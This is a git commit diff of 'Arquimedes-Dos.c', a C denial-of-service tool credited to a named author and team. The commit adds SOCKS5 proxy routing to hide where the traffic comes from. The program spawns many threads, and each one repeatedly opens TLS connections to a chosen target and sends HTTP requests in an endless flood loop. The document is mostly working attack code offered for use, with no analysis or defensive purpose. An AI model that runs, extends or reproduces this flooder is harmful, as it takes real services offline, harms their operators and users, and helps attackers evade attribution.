70d852d965df9d338e35035006b8b17efcea6cb0
Јӊөҋ | 🇯🇲 <vicentinreidelas0@gmail.com>
2025-05-17 19:26:20 -0300

    Update Arquimedes-Dos.c

--- Arquimedes-Dos.c
+++ Arquimedes-Dos.c
@@ -10,11 +10,78 @@
 #include <netinet/in.h>
 #include <sys/socket.h>
 
-char *target_host = "example.com";
+char *target_host = NULL;
 int target_port = 443;
 int threads = 50;
-char *local_ip = NULL;
-int local_port = 0;
+char *proxy_ip = NULL;
+int proxy_port = 0;
+
+int connect_via_socks5(const char *proxy_ip, int proxy_port, const char *dest_host, int dest_port) {
+    int sockfd;
+    struct sockaddr_in proxy_addr;
+
+    sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (sockfd < 0) return -1;
+
+    memset(&proxy_addr, 0, sizeof(proxy_addr));
+    proxy_addr.sin_family = AF_INET;
+    proxy_addr.sin_port = htons(proxy_port);
+    if (inet_pton(AF_INET, proxy_ip, &proxy_addr.sin_addr) <= 0) {
+        close(sockfd);
+        return -1;
+    }
+
+    if (connect(sockfd, (struct sockaddr*)&proxy_addr, sizeof(proxy_addr)) < 0) {
+        close(sockfd);
+        return -1;
+    }
+
+    unsigned char buf[512];
+    int n;
+    unsigned char greeting[3] = {0x05, 0x01, 0x00};
+    if (write(sockfd, greeting, 3) != 3) {
+        close(sockfd);
+        return -1;
+    }
+
+    n = read(sockfd, buf, 2);
+    if (n != 2 || buf[0] != 0x05 || buf[1] != 0x00) {
+        close(sockfd);
+        return -1;
+    }
+
+    int host_len = strlen(dest_host);
+    int req_len = 7 + host_len;
+    unsigned char *req = malloc(req_len);
+    if (!req) {
+        close(sockfd);
+        return -1;
+    }
+
+    req[0] = 0x05;
+    req[1] = 0x01;
+    req[2] = 0x00;
+    req[3] = 0x03;
+    req[4] = (unsigned char)host_len;
+    memcpy(&req[5], dest_host, host_len);
+    req[5 + host_len] = (unsigned char)(dest_port >> 8);
+    req[6 + host_len] = (unsigned char)(dest_port & 0xFF);
+
+    if (write(sockfd, req, req_len) != req_len) {
+        free(req);
+        close(sockfd);
+        return -1;
+    }
+    free(req);
+
+    n = read(sockfd, buf, 10);
+    if (n < 7 || buf[1] != 0x00) {
+        close(sockfd);
+        return -1;
+    }
+
+    return sockfd;
+}
 
 void* flood(void* arg) {
     SSL_library_init();
@@ -22,43 +89,33 @@ void* flood(void* arg) {
     int packet_count = 0;
 
     while (1) {
-        struct hostent *host = gethostbyname(target_host);
-        if (!host) continue;
-
-        struct sockaddr_in addr;
-        int sock = socket(AF_INET, SOCK_STREAM, 0);
-
-        if (local_ip != NULL && local_port != 0) {
-            struct sockaddr_in local_addr;
-            local_addr.sin_family = AF_INET;
-            local_addr.sin_port = htons(local_port);
-            local_addr.sin_addr.s_addr = inet_addr(local_ip);
-            bind(sock, (struct sockaddr*)&local_addr, sizeof(local_addr));
-        }
-
-        addr.sin_family = AF_INET;
-        addr.sin_port = htons(target_port);
-        addr.sin_addr = *((struct in_addr*) host->h_addr);
-
-        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
-            close(sock);
-            continue;
+        int sock;
+        if (proxy_ip && proxy_port) {
+            sock = connect_via_socks5(proxy_ip, proxy_port, target_host, target_port);
+            if (sock < 0) continue;
+        } else {
+            struct hostent *host = gethostbyname(target_host);
+            struct sockaddr_in addr;
+            sock = socket(AF_INET, SOCK_STREAM, 0);
+            if (sock < 0) continue;
+            addr.sin_family = AF_INET;
+            addr.sin_port = htons(target_port);
+            addr.sin_addr = *((struct in_addr*) host->h_addr);
+            if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
+                close(sock);
+                continue;
+            }
         }
 
         SSL *ssl = SSL_new(ctx);
         SSL_set_fd(ssl, sock);
         if (SSL_connect(ssl) != -1) {
-            char req[1024];
+            char req[256];
             snprintf(req, sizeof(req), "GET / HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\n\r\n", target_host);
             SSL_write(ssl, req, strlen(req));
             packet_count++;
-            printf("Arquimedes-Dos -> %d pacote%s enviado%s para %s!\n", 
-                   packet_count, 
-                   packet_count == 1 ? "" : "s",
-                   packet_count == 1 ? "" : "s",
-                   target_host);
+            printf("Arquimedes-DoS -> %d pacote(s) enviado(s) para %s!\n", packet_count, target_host);
         }
-
         SSL_shutdown(ssl);
         SSL_free(ssl);
         close(sock);
@@ -70,42 +127,32 @@ void* flood(void* arg) {
 
 int main(int argc, char *argv[]) {
     if (argc < 7) {
-        printf("Uso: ./arquimedes -I <host> -p <porta> -t <threads> [-l <ip_local> -lp <porta_local>]\n");
+        printf("Usage: ./arquimedes -I <host> -p <port> -t <threads> [-l <proxy_ip> -lp <proxy_port>]\n");
         return 1;
     }
 
     for (int i = 1; i < argc; i++) {
-        if (strcmp(argv[i], "-I") == 0) {
-            target_host = argv[i + 1];
-        }
-        if (strcmp(argv[i], "-p") == 0) {
-            target_port = atoi(argv[i + 1]);
-        }
-        if (strcmp(argv[i], "-t") == 0) {
-            threads = atoi(argv[i + 1]);
-        }
-        if (strcmp(argv[i], "-l") == 0) {
-            local_ip = argv[i + 1];
-        }
-        if (strcmp(argv[i], "-lp") == 0) {
-            local_port = atoi(argv[i + 1]);
-        }
+        if (strcmp(argv[i], "-I") == 0 && i + 1 < argc) target_host = argv[++i];
+        else if (strcmp(argv[i], "-p") == 0 && i + 1 < argc) target_port = atoi(argv[++i]);
+        else if (strcmp(argv[i], "-t") == 0 && i + 1 < argc) threads = atoi(argv[++i]);
+        else if (strcmp(argv[i], "-l") == 0 && i + 1 < argc) proxy_ip = argv[++i];
+        else if (strcmp(argv[i], "-lp") == 0 && i + 1 < argc) proxy_port = atoi(argv[++i]);
     }
 
-    printf("\nAtaque iniciado!\n\n");
-    printf("🪓 By - Jhon Lamdenberguer\n");
-    printf("💻 Team - Família Flodder Techno\n");
-    printf("📱 Ferramenta - Arquimedes DoS\n\n");
+    if (!target_host) {
+        printf("Host não definido\n");
+        return 1;
+    }
+
+    printf("𖤛 Arquimedes DoS iniciado por Jhon Lamdenberguer 𖤛\n");
+    printf("🪓 By - Jhon Lamdenberguer\n💻 Team - Família Flodder Techno\n📱 Ferramenta - Arquimedes DoS\n\n");
 
     pthread_t tid[threads];
     for (int i = 0; i < threads; i++) {
         pthread_create(&tid[i], NULL, flood, NULL);
         usleep(10000);
     }
-
-    for (int i = 0; i < threads; i++) {
-        pthread_join(tid[i], NULL);
-    }
+    for (int i = 0; i < threads; i++) pthread_join(tid[i], NULL);
 
     return 0;
 }
